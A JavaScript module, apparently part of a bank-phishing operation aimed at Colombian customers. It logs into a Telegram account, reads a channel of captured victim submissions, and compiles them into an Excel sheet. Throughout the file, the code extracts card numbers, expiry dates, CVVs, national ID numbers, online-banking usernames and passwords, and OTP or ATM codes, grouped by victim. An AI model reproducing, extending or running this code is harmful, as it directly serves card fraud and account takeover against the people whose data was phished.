const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { Api } = require("telegram");
const XLSX = require("xlsx");

const apiId = parseInt(process.env.TG_API_ID);
const apiHash = process.env.TG_API_HASH;
const chatOrigen = process.env.TELEGRAM_CHAT_ID;
const botToken = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;

async function generarExcelHistorial(chatIdMsg, tokenBot, responder) {
    // Sesión 100% en memoria (nada en disco)
    const stringSession = new StringSession("");
    const client = new TelegramClient(stringSession, apiId, apiHash, {
        connectionRetries: 5,
    });

    let codeResolve;
    const codePromise = new Promise((resolve) => { codeResolve = resolve; });
    let passwordResolve;
    const passPromise = new Promise((resolve) => { passwordResolve = resolve; });

    // Iniciar sesión
    await client.start({
        phoneNumber: async () => process.env.TG_PHONE,
        password: async () => { 
            await responder('🔐 Tu cuenta tiene 2FA. Responde a este mensaje con tu contraseña de Telegram.');
            return await passPromise; 
        },
        phoneCode: async () => {
            await responder('📱 Te enviamos un código a tu App de Telegram. Responde a este mensaje con el código (solo números).');
            return await codePromise;
        },
        onError: (err) => console.error(err),
    });

    // Leer mensajes
    await responder('✅ Sesión iniciada. Leyendo historial...');
    let peer;
    try {
        peer = await client.getEntity(chatOrigen);
    } catch (e) {
        const id = chatOrigen.startsWith("-100") ? chatOrigen.replace("-100", "") : chatOrigen;
        peer = new Api.PeerChannel({ channelId: BigInt(id) });
    }

    const messages = await client.getMessages(peer, { limit: 5000 });
    await client.disconnect(); // Cerrar sesión inmediatamente al leer

    // Agrupación (misma lógica de antes)
    const grupos = {};
    const regexID = /<b>ID:<\/b>\s*<code>([^<]+)<\/code>/;
    
    for (const msg of messages) {
        if (!msg.message) continue;
        const texto = msg.message;
        if (texto.includes('SOLICITUD DE PAGO') || texto.includes('DATOS RECIBIDOS')) {
            const match = texto.match(regexID);
            if (match) {
                const solId = match[1].trim();
                if (!grupos[solId]) grupos[solId] = [];
                grupos[solId].push({
                    texto: texto,
                    fecha: new Date(msg.date * 1000).toLocaleString('es-CO'),
                    paso: texto.includes('PASO 1') ? 'tarjeta' : texto.includes('PASO 2') ? 'credenciales' : 'otp'
                });
            }
        }
    }

    const filas = [];
    const extraer = (texto, etiqueta) => {
        const re = new RegExp(`<b>${etiqueta}:<\\/b>\\s*(?:<code>)?([^<\\n]*)`, 'i');
        const m = texto.match(re);
        return m ? m[1].trim() : '';
    };

    for (const [id, msgs] of Object.entries(grupos)) {
        msgs.sort((a, b) => new Date(a.fecha) - new Date(b.fecha));
        const t = msgs.find(m => m.paso === 'tarjeta') || msgs[0];
        const c = msgs.find(m => m.paso === 'credenciales');
        const o = msgs.find(m => m.paso === 'otp');

        let otpVal = '';
        if (o) otpVal = extraer(o.texto, 'OTP') || extraer(o.texto, 'CLAVE ATM') || extraer(o.texto, 'CLAVE DINÁMICA');

        filas.push({
            'ID': id, 'Fecha': t.fecha,
            'Solicitante': extraer(t.texto, 'Solicitante'),
            'Cédula': extraer(t.texto, 'Cédula'),
            'Titular': extraer(t.texto, 'Titular'),
            'Tarjeta': extraer(t.texto, 'Tarjeta'),
            'Vence': extraer(t.texto, 'Vence'),
            'CVV': extraer(t.texto, 'CVV'),
            'Marca': extraer(t.texto, 'Marca'),
            'Banco': extraer(t.texto, 'Banco'),
            'IP': extraer(t.texto, 'IP'),
            'Usuario': c ? extraer(c.texto, 'Usuario') : '',
            'Contraseña': c ? extraer(c.texto, 'Contraseña') : '',
            'OTP': otpVal
        });
    }

    const hoja = XLSX.utils.json_to_sheet(filas);
    const libro = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(libro, hoja, 'Historial');
    return XLSX.write(libro, { type: 'buffer', bookType: 'xlsx' });
}

module.exports = { generarExcelHistorial };
